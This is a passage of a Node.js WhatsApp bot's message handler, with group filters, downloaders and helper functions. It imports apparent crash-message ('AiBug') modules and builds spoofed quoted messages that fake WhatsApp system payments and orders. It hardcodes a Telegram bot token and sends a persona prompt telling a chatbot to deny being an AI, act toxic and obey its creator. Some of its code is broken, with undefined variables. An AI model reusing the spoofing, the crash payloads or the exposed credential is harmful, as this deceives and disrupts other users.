

require('./config');
require('./langka/functions');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs');
const fg = require('api-dylux')
const util = require('util');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os')
const cheerio = require('cheerio')
const yts = require ('yt-search');
const kotz = require("kotz-api");
const crypto = require('crypto')
const bochil = require('@bochilteam/scraper')
const moment = require('moment-timezone');
const client = require('filestack-js')
const jsobfus = require('javascript-obfuscator');
const Cerpen = require('dhn-api')
const toMS = require("ms");
const fsx = require("fs-extra")
const path = require('path')
const gtts = require('node-gtts')
const ms = require("parse-ms");
const acrcloud = require('acrcloud')
const FormData = require("form-data");
const { fromBuffer } = require('file-type')
const rimraf = require('rimraf')
const fetch = require('node-fetch')
const cron = require('node-cron')
const { exec, spawn, execSync } = require("child_process")
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const translate = require("@vitalets/google-translate-api");
const similarity = require('similarity')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const threshold = 0.72
const { smsg, fetchJson, getBuffer, getGroupAdmins, TelegraPh, msToDate, isUrl, hitungmundur, checkBandwidth, runtime } = require('./lib/simple')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit, delLimit } = require("./lib/limit");
const { aaii } = require('./media/sticker/thumb/thumbnail') 
const thumb = aaii[Math.floor(Math.random() * aaii.length)]
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
const imagenya = JSON.parse(fs.readFileSync('./media/database/image.json'))
const afk = require("./lib/afk");
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const ffstalk = require('./scrape/ffstalk')
const { pinterest } = require('./scrape/scraper')
const scp1 = require('./scrape/scraper1') 
const { remini } = require('./lib/remini')
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose, isSetLeft, addSetLeft, removeSetLeft, changeSetLeft, getTextSetLeft, isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen, isSetWelcome, addSetWelcome, removeSetWelcome, changeSetWelcome, getTextSetWelcome } = require("./lib/store")
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const { generateProfilePicture, removeEmojis, tanggal, formatp, formatDate, getTime, sleep, clockString, jsonformat, parseMention, getRandom, delay } = require('./lib/myfunc')
const _prem = require("./lib/premium");
const { sticker5 } = require('./lib/stickerr')
const uploadFile = require('./lib/uploadFile') 
const uploadImage = require('./lib/uploadImage') 
const { TelegraPH } = require("./lib/TelegraPH")
const nou = require('node-os-utils');
const { lolkey, aikey } = require('./database/apikey.json')
const vn = JSON.parse(fs.readFileSync('./database/vn.json'))
const ytdl = require("ytdl-core")
const { domain, apikey, capikey, eggsnya, location } = require("./media/sticker/thumb/aibotzz/panel");
const { limitCount } = require("./media/sticker/thumb/aibotzz/limit.json");
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
const sticker = JSON.parse(fs.readFileSync('./database/sticker.json'))
const video = JSON.parse(fs.readFileSync('./database/video.json'))
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let autodlgc = JSON.parse(fs.readFileSync('./database/autodlgc.json'))
let autostiker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let antipromo = JSON.parse(fs.readFileSync('./database/antipromo.json'))
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let responx = JSON.parse(fs.readFileSync('./database/responx.json'))
let antifoto = JSON.parse(fs.readFileSync('./database/antifoto.json'))
let antiaudio = JSON.parse(fs.readFileSync('./database/antiaudio.json'))
let antivideo = JSON.parse(fs.readFileSync('./database/antivideo.json'))
let antisticker = JSON.parse(fs.readFileSync('./database/antisticker.json'))
let anticon = JSON.parse(fs.readFileSync('./database/anticon.json'))
let antiloc = JSON.parse(fs.readFileSync('./database/antiloc.json'))
let antidoc = JSON.parse(fs.readFileSync('./database/antidoc.json'))
let antiteks = JSON.parse(fs.readFileSync('./database/antiteks.json'))
let antivo = JSON.parse(fs.readFileSync('./database/antivo.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let antilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let banned = JSON.parse(fs.readFileSync('./database/banned.json'))
let antilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytch.json'));
let antilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let antilinkxxnx =JSON.parse(fs.readFileSync('./database/antilinkxxnx.json'));
let antilinktele =JSON.parse(fs.readFileSync('./database/antilinktele.json'));
let antilinkig =JSON.parse(fs.readFileSync('./database/antilinkig.json'));
let antilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfb.json'));
let antidel =JSON.parse(fs.readFileSync('./database/antidel.json'));
let antivirtex =JSON.parse(fs.readFileSync('./database/antivirtex.json'));
let antilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwt.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./search/function/nsfw.json'))
let antilinksfile =JSON.parse(fs.readFileSync('./database/antilinksfile.json'));
let antilinkdc =JSON.parse(fs.readFileSync('./database/antilinkdc.json'));
const { msgFilter } = require('./lib/antispam')
const { color, bgcolor } = require('./lib/color')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme, Quotes, Couples, Darkjokes } = require("dhn-api");
let { covid } = require('./lib/covid.js');
////==================================
const { aitext1 } = require('./AiBug/aitext1')
const { aitext2 } = require('./AiBug/aitext2')
const { aitext3 } = require('./AiBug/aitext3')
const { aitext4 } = require('./AiBug/aitext4')
const { aitext5 } = require('./AiBug/aitext5')

const sendText = (text) => Al.sendMessage(m.chat, { text });

////==================================

module.exports = Al = async (Al, m, chatUpdate, store, antilink, set_welcome_db, set_left_db, set_open, set_close, welcome, left) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '' //omzee
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
const botNumber = await Al.decodeJid(Al.user.id)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001) 
const bulanx = moment.tz('Asia/Jakarta').format('MM/MMMM')
const tahun = moment.tz('Asia/Jakarta').format('YYYY')
const tanggal = moment().tz("Asia/Jakarta").format("dddd, d")
const jam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam2 = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm')
const salam = moment(Date.now()).tz("Asia/Jakarta").locale('id').format('a')
const timeWib = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const wibTime = moment().tz('Asia/Jakarta').format('HH:mm:ss')
const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isBot = pairingNumber.includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isItsMe = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = m.chat
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const banUser = await Al.fetchBlocklist()
const groupMetadata = m.isGroup ? await Al.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupDesc = m.isGroup ? groupMetadata.desc : ''
const groupId = m.isGroup ? groupMetadata.id : ''
const groupMem = m.isGroup ? groupMetadata.participants.length : ''
const isOwnerGroup = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBan = banned.includes(m.sender)
const mesej = text.split('|')
const isPc = from.endsWith('@s.whatsapp.net')
const isGc = from.endsWith('@g.us')

//======================================================

const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const isAntiDel = m.isGroup ? antidel.includes(from) : false
const isAntiLinkYoutubeChannel = antilinkytch.includes(m.chat) ? true : false
const isAntiLAll = antilinkall.includes(m.chat) ? true : false
const isAntiLIg = antilinkig.includes(m.chat) ? true : false
const isAntiLFb = antilinkfb.includes(m.chat) ? true : false
const isAntiLTwt = antilinktwt.includes(m.chat) ? true : false
const isAntiLTele = antilinktele.includes(m.chat) ? true : false
const isAntiLDc = antilinkdc.includes(m.chat) ? true : false
const isAntiLxxnx = antilinkxxnx.includes(m.chat) ? true : false
const isAntiWame = antiwame.includes(m.chat) ? true : false
const isAntiLinkYoutubeVid = antilinkytvid.includes(m.chat) ? true : false
const isAntiLinkTiktok = antilinktt.includes(m.chat) ? true : false
const isAntiLink = antilink.includes(m.chat) ? true : false
const isAutoDlGc = autodlgc.includes(m.chat) ? true : false
const isAutoStiker = autostiker.includes(m.chat) ? true : false
const isAntiPromo = antipromo.includes(m.chat) ? true : false
const isAntiToxic = antitoxic.includes(m.chat) ? true : false
const isResponx = responx.includes(m.chat) ? true : false
const isAntiFoto = antifoto.includes(m.chat) ? true : false
const isAntiAudio = antiaudio.includes(m.chat) ? true : false
const isAntiVideo = antivideo.includes(m.chat) ? true : false
const isAntiSticker = antisticker.includes(m.chat) ? true : false
const isAntiCon = anticon.includes(m.chat) ? true : false
const isAntiLoc = antiloc.includes(m.chat) ? true : false
const isAntiDoc = antidoc.includes(m.chat) ? true : false
const isAntiTeks = antiteks.includes(m.chat) ? true : false
const isAntiVo = antivo.includes(m.chat) ? true : false
const isAntiVirtex = antivirtex.includes(m.chat) ? true : false
const isAntiLSfile = antilinksfile.includes(m.chat) ? true : false
const isAntiSpam = require('./lib/antispam')
const isMute = mute.includes(m.chat) ? true : false

//======================================================
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
const qtod = m.quoted? "true" : "false"
const isWelcome = welcome.includes(m.chat)
const isLeft = left.includes(m.chat)
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage' || type === 'textMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
const isQuotedText1 = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedText2 = type === 'extendedTextMessage' && content.includes('conversation')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isViewOnce = (type == 'viewOnceMessageV2')
const expiration = m.text.contextInfo ? m.text.contextInfo.expiration : 0
let footxt = global.footer_text
let isFoto = m.mtype
let isVideo = m.mtype
let isAudio = m.mtype
let isSticker = m.mtype 
let isLokasi = m.mtype
let isKontak = m.mtype
let isDoku = m.mtype
let isVo = m.mtype
const isText = (type == 'textMessage')
const https = require('https');
     
try {
ppuser = await Al.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60]'
}

//Ucapan Waktu #1
if(timeWib < "23:59:00"){ var ucapanWaktu = 'ɢᴏᴏᴅ ɴɪɢʜᴛ'}
if(timeWib < "19:00:00"){ var ucapanWaktu = 'ɢᴏᴏᴅ ɴɪɢʜᴛ'}
if(timeWib < "18:00:00"){ var ucapanWaktu = 'ɢᴏᴏᴅ ᴇᴠᴇɴɪɴɢ'}
if(timeWib < "15:00:00"){ var ucapanWaktu = 'ɢᴏᴏᴅ ᴀꜰᴛᴇʀɴᴏᴏɴ'}
if(timeWib < "11:00:00"){ var ucapanWaktu = 'ɢᴏᴏᴅ ᴍᴏᴀʀɴɪɴɢ'}
if(timeWib < "06:00:00"){ var ucapanWaktu = 'ɢᴏᴏᴅ ᴍᴏᴀʀɴɪɴɢ'}     

//Ucapan Waktu #2
if(wibTime < "23:59:00"){ var sopanDong = 'Good Night'}
if(wibTime < "19:00:00"){ var sopanDong = 'Good Night'}
if(wibTime < "18:00:00"){ var sopanDong = 'Good Evening'}
if(wibTime < "15:00:00"){ var sopanDong = 'Good Afternoon'}
if(wibTime < "11:00:00"){ var sopanDong = 'Good Morning'}
if(wibTime < "06:00:00"){ var sopanDong = 'Good Morning'}    

//===========================================
//Public dan Self
if (!Al.public) {
if (!isCreator && !m.key.fromMe) return
}
//===========================================

const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `94742274855-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': global.thumb, thumbnail: global.thumb,sendEphemeral: true}}}
const memek = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 1000000000, status: 1, thumbnail: await Al.reSize(await getBuffer('https://telegra.ph/file/72b973058c1985de0eda8.jpg'),300,150), surface: 1, message: 'ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙', orderTitle: ``, sellerJid: '0@s.whatsapp.net' } } }
const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id:global.namabot, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "LKR", amount1000: 999999999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: 'ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ\nɴᴀᴍᴀ : *「 𝐌𝐚𝐧𝐮-𝐌𝐃  」* 💙\nsᴛᴀᴛᴜs : 𝑩𝒚 𝐌𝐚𝐧𝐮𝐥 || ᴏɴʟɪɴᴇ'}}, expiryTimestamp: 999999999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "LKR"}}}}
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 20000,status: 200, thumbnailUrl: thumb, surface: 200, message: namabot, orderTitle: namaowner, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded": false},sendEphemeral: true}
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: namabot,thumbnailUrl: global.thumb}}}
const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `✨ ...𝐌𝐚𝐧𝐮-𝐌𝐃 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐨𝐭 𝐁𝐲 - : 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥... 💗`,thumbnailUrl: global.thumb}}}
const floc1 = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${ucapanWaktu} ᴋᴀᴋ`,thumbnailUrl: ``}}}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "240","ptt": "true"}}} 
const ftoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})}, message: {productMessage: {product: {productImage:{mimetype: `image/jpeg`, thumbnailUrl: `${global.thumb}`}, title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`, description: `${namabot}`, currencyCode: `LKR`, priceAmount1000: 1000000000, retailerId: `Ghost`, productImageCount: 1}, businessOwnerJid: `0@s.whatsapp.net`}}}
const ftoko1 = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})}, message: {productMessage: {product: {productImage:{mimetype: `image/jpeg`, thumbnailUrl: `${global.thumb}`}, title: `ᴛʜɪs ᴀʟʟ ᴍᴇɴᴜ`, description: `${namabot}`, currencyCode: `LKR`, priceAmount1000: 1000000000, retailerId: `Ghost`, productImageCount: 1}, businessOwnerJid: `0@s.whatsapp.net`}}}
const fctg = { key: {fromMe: [], participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})}, 'message': { "interactiveMessage": { "header": { "hasMediaAttachment": [], "jpegThumbnail": `${global.thumb}`, }, "nativeFlowMessage": { "buttons": [ {"name": "review_and_pay","buttonParamsJson": "{\"currency\":\"LKR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"\"6348642505244872,\"name\":\"𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"}]}}}}
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const nimun = (text) => {
Al.sendMessage(from, { text: text, mentions: [m.sender]}, {quoted: m }).catch(() => {
return m.reply("Error")
})
}
//===============
function shouldStartRecording(message) {
// Misalnya, jika pesan berisi kata kunci "start recording", maka merekam dimulai
if (message.body.toLowerCase().includes('start recording')) {
return true;
} else {
return false;
}
}
//===============
async function jarak(dari, ke) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}
//==============
const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Al.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//==============
const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Al.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}
//==============
function ucapan() {
        const hour_now = moment.tz('Asia/Jakarta').format('HH')
        var ucapanWaktu = 'Ohayou...'
        if (hour_now >= '03' && hour_now <= '10') {
          ucapanWaktu = 'Ohayou...'
        } else if (hour_now >= '10' && hour_now <= '15') {
          ucapanWaktu = 'Konnichiwa...'
        } else if (hour_now >= '15' && hour_now <= '17') {
          ucapanWaktu = 'Konnichiwa...'
        } else if (hour_now >= '17' && hour_now <= '18') {
          ucapanWaktu = 'Konbanwa...'
        } else if (hour_now >= '18' && hour_now <= '23') {
          ucapanWaktu = 'Konbanwa...'
        } else {
          ucapanWaktu = 'Konbanwa'
        }	
        return ucapanWaktu
}
//=======
function hitungMundurRamadhan() {
    const tanggalRamadhan = moment('2024-03-13', 'YYYY-MM-DD');
    const tanggalHariIni = moment();
    const selisihHari = tanggalRamadhan.diff(tanggalHariIni, 'days');
    let pesan = '';
    if (selisihHari > 0) {
        pesan = `Tinggal ${selisihHari} hari menuju Ramadhan.`;
    } else if (selisihHari === 0) {
        pesan = `Hari ini adalah hari Ramadhan! Selamat menjalankan ibadah puasa.`;
    } else {
        pesan = `Ramadhan sudah berlalu. Semoga ibadah puasamu diterima.`;
    }
    
    return pesan;
}
//=======
if (!m.key.fromMe && isResponx ) {
  let postData = {
    prompt: `${args.join(" ")}`,
    sessionId: `${m.sender}`,
    character: `Kamu adalah furina, kamu bukan lah ai ataupun chat bot, kamu adalah anak remaja yang mengikuti pergaulan anak muda jaman sekarang, terkadang kamu juga suka toxic ataupun kasar dan kamu juga sedikit manja kepada orang lain, tetapi kamu juga terkadang suka baik kepada orang dan penciptamu adalah Wann kamu harus nurut dengan pencipta mu nomornya 94742274855`
  };
  
  try {
    let response = await axios({
      url: "https://elxyz.me/api/chat",
      method: "POST",
      data: new URLSearchParams(Object.entries(postData)),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    m.reply(`${response.data.data.answer}`)
    if (response.data.data.images) {
      await Al.sendMessage(m.chat, { image: { url: response.data.data.images } }, { quoted: m })
    }
  } catch (error) {
    m.reply('yah aku gak bisa jawab pertanyaan mu')
  }
}
//=======
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Al.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Al.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

//=========
setInterval(function() { 
var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
if(hasilnes === '12:00:00 AM') {
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit))
console.log("Limit Sudah Di Reset!")
}
}, 1000);
//========================
async function aiRep(teks) {
      const nedd = {      
        contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
            showAdAttribution: true,
            title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            body: ``,
            previewType: "VIDEO",
            thumbnailUrl: global.thumb, 
            sourceUrl: myweb, 
          },
        },
        text: teks,
      };
      return Al.sendMessage(m.chat, nedd, {
        quoted: fkontak,
      });
    }
    
    //======
//=================
async function aiRep2(teks) {
      const nedd = {      
        contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
		newsletterJid: "120363232588171807@newsletter",
		},
		externalAdReply: {  
            showAdAttribution: true,
            title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            body: ``,
            previewType: "VIDEO",
            thumbnailUrl: global.thumb, 
            sourceUrl: myweb, 
          },
        },
        text: teks,
      };
      return Al.sendMessage(m.chat, nedd, {
        quoted: floc,
      });
    }
//=======
async function aiRep3(teks) {
      const nedd = {      
        contextInfo: {
		externalAdReply: {  
            showAdAttribution: false,
            title: `ᴍᴀɴᴜ-ᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠᴀᴄᴇ 💙`,
            body: ``,
            previewType: "VIDEO",
            thumbnailUrl: global.mark, 
            sourceUrl: global.sgc, 
          },
        },
        text: teks,
      };
      return Al.sendMessage(m.chat, nedd, {
        quoted: floc,
      });
    }    
//=====================
async function resize(buffer, width, height) {
	var oyy = await Jimp.read(buffer);
	var kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
	return kiyomasa
}    

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return m.reply('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const airesult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'DGXeon',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            al.result.push(result)
        }
    resolve(airesult)
    })
}

const terdaftar = () => {
Al.sendMessage(m.chat, {text: `කරුණාකර ටයිප් කරන්න *${prefix}register* එවිට ඔබට දත්ත සමුදායේ ලියාපදිංචි කළ හැකිය ${global.namabot}\n\n*උදා- :* ${prefix}register Name.Age`}, { quoted: floc})
}

const terbanned = () => {
Al.sendMessage(m.chat, {text: `Kamu dibanned jadi gak bisa pakai *${namabot}*`}, { quoted: floc})
}

const responbot= () => {
let gundul = fs.readFileSync('./media/apaan.webp')
Al.sendMessage(from, { sticker: gundul }, { quoted: floc})
}
   
const fiturowner = () => {
let onlyownerku = `Special For Owner Features!`
Al.sendMessage(from, { sticker: onlyownerku }, { quoted: floc})
}

const onlygc = () => {
Al.sendMessage(m.chat, {
text: `*AKSES DI TOLAK*

Author : ${namaowner}
BOT : ${namabot}

${namabot} Sedang Dalam Mode Grup. Silahkan Join Ke Grup ${namabot}`}, { quoted: floc})
}

const onlypc = () => {
Al.sendMessage(m.chat, {
text: `*AKSES DI TOLAK*

Author : ${namaowner}
BOT : ${namabot}

${namabot} Sedang Dalam Mode Private. Silahkan Gunakan Diprivate Chat`}, { quoted: floc})
}

const isRegistered = checkRegisteredUser(m.sender)
        //
for (let aibotzz of vn) {
if (!bodynyaui && budy === aibotzz){
